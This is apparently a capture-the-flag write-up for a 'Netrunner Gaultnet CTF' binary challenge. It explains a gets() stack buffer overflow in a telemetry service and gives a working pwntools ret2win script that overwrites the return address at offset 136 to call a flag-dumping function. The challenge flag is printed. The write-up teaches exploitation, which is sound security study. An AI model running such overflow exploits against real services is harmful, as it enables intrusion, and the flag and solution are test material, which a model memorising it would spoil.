---
title: "Coolant Pump Daemon: Stack Buffer Overflow & ROP Chain"
date: 2026-10-28T15:00:00+05:30
description: "Exploiting unbounded stack read buffer in remote telemetry service to achieve code execution."
category: "Binary Exploitation"
ctf: "Netrunner Gaultnet CTF"
difficulty: "Medium"
points: 350
flag: "NR{p1p3_c00l4nt_st4ck_0v3rfl0w_r3t2w1n}"
author: "Reshma Al (Coldcoffee)"
tools: "GDB-GEF, pwntools, Python 3"
tags:
  - "Binary Exploitation"
  - "Netrunner Gaultnet CTF"
  - "Coldcoffee Solves"
---

<div class="flag-callout">
  <span class="flag-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg> Captured Flag</span>
  <code>NR{p1p3_c00l4nt_st4ck_0v3rfl0w_r3t2w1n}</code>
  <button class="flag-copy-btn" onclick="navigator.clipboard.writeText('NR{p1p3_c00l4nt_st4ck_0v3rfl0w_r3t2w1n}');this.innerText='Copied!';setTimeout(()=>this.innerText='Copy',2000)">Copy</button>
</div>


## 1. Vulnerability Analysis
The target binary `coolant_mon` runs as an unprivileged service on TCP port 7777.
Running `checksec`:
- Arch: x86-64
- Canary: Disabled
- NX: Enabled
- PIE: Disabled (`0x400000`)

In function `process_telemetry()`:
```c
void process_telemetry() {
    char buf[128];
    printf("Enter telemetry stream: ");
    gets(buf); // Danger: gets() allows unbounded stack overwrite!
}
```

The binary contains an uncalled diagnostic function at `0x4011f6` (`dump_vault()`) that opens `flag.txt` and writes it to standard output.

---

## 2. Exploitation Walkthrough
1. **Offset Discovery:** Cyclic pattern generation located the return address overwrite offset at 136 bytes ($128$ buffer + $8$ RBP).
2. **Stack Alignment:** Because `system()` or `puts()` uses SSE instructions requiring 16-byte stack alignment, we prepend a `ret` gadget prior to calling `dump_vault`.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
p = remote('127.0.0.1', 7777)

ret_gadget = 0x40101a
dump_vault = 0x4011f6

payload = b'A' * 136
payload += p64(ret_gadget) # align stack
payload += p64(dump_vault)

p.sendlineafter(b': ', payload)
print(p.recvall().decode())
```

